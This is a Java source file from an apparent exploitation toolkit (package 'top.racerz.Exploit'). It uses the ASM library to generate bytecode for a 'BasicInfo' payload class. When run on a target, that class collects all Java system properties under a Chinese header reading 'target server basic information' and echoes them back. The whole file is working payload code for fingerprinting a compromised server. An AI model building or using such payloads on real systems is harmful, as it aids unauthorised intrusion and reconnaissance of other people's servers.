package top.racerz.Exploit;

import org.objectweb.asm.*;

public class BasicInfo implements Opcodes {

    public static void insert(ClassWriter cw) {
        FieldVisitor fv;
        MethodVisitor mv;

        {
            fv = cw.visitField(ACC_PRIVATE, "result", "Ljava/lang/String;", null, null);
            fv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, new String[]{"java/lang/Exception"});
            mv.visitCode();
            Label l0 = new Label();
            mv.visitLabel(l0);
            mv.visitLineNumber(10, l0);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
            Label l1 = new Label();
            mv.visitLabel(l1);
            mv.visitLineNumber(11, l1);
            mv.visitTypeInsn(NEW, "java/lang/StringBuilder");
            mv.visitInsn(DUP);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
            mv.visitVarInsn(ASTORE, 1);
            Label l2 = new Label();
            mv.visitLabel(l2);
            mv.visitLineNumber(12, l2);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitLdcInsn("\u76ee\u6807\u670d\u52a1\u5668\u57fa\u672c\u4fe1\u606f\uff1a\n");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitInsn(POP);
            Label l3 = new Label();
            mv.visitLabel(l3);
            mv.visitLineNumber(13, l3);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/System", "getProperties", "()Ljava/util/Properties;", false);
            mv.visitVarInsn(ASTORE, 2);
            Label l4 = new Label();
            mv.visitLabel(l4);
            mv.visitLineNumber(15, l4);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/util/Properties", "stringPropertyNames", "()Ljava/util/Set;", false);
            mv.visitMethodInsn(INVOKEINTERFACE, "java/util/Set", "iterator", "()Ljava/util/Iterator;", true);
            mv.visitVarInsn(ASTORE, 3);
            Label l5 = new Label();
            mv.visitLabel(l5);
            mv.visitLineNumber(17, l5);
            mv.visitFrame(Opcodes.F_FULL, 4, new Object[]{"BasicInfo", "java/lang/StringBuilder", "java/util/Properties", "java/util/Iterator"}, 0, new Object[]{});
            mv.visitVarInsn(ALOAD, 3);
            mv.visitMethodInsn(INVOKEINTERFACE, "java/util/Iterator", "hasNext", "()Z", true);
            Label l6 = new Label();
            mv.visitJumpInsn(IFEQ, l6);
            Label l7 = new Label();
            mv.visitLabel(l7);
            mv.visitLineNumber(18, l7);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitMethodInsn(INVOKEINTERFACE, "java/util/Iterator", "next", "()Ljava/lang/Object;", true);
            mv.visitTypeInsn(CHECKCAST, "java/lang/String");
            mv.visitVarInsn(ASTORE, 4);
            Label l8 = new Label();
            mv.visitLabel(l8);
            mv.visitLineNumber(19, l8);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitLdcInsn(": ");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/util/Properties", "getProperty", "(Ljava/lang/String;)Ljava/lang/String;", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitLdcInsn("\n");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitInsn(POP);
            Label l9 = new Label();
            mv.visitLabel(l9);
            mv.visitLineNumber(20, l9);
            mv.visitJumpInsn(GOTO, l5);
            mv.visitLabel(l6);
            mv.visitLineNumber(22, l6);
            mv.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/String", "valueOf", "(Ljava/lang/Object;)Ljava/lang/String;", false);
            mv.visitFieldInsn(PUTFIELD, "BasicInfo", "result", "Ljava/lang/String;");
            Label l10 = new Label();
            mv.visitLabel(l10);
            mv.visitLineNumber(24, l10);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKEVIRTUAL, "BasicInfo", "echo", "()V", false);
            Label l11 = new Label();
            mv.visitLabel(l11);
            mv.visitLineNumber(25, l11);
            mv.visitInsn(RETURN);
            Label l12 = new Label();
            mv.visitLabel(l12);
            mv.visitLocalVariable("key", "Ljava/lang/String;", null, l8, l9, 4);
            mv.visitLocalVariable("this", "LBasicInfo;", null, l0, l12, 0);
            mv.visitLocalVariable("result", "Ljava/lang/StringBuilder;", null, l2, l12, 1);
            mv.visitLocalVariable("props", "Ljava/util/Properties;", null, l4, l12, 2);
            mv.visitLocalVariable("iterator", "Ljava/util/Iterator;", "Ljava/util/Iterator<Ljava/lang/String;>;", l5, l12, 3);
            mv.visitMaxs(3, 5);
            mv.visitEnd();
        }
    }
}
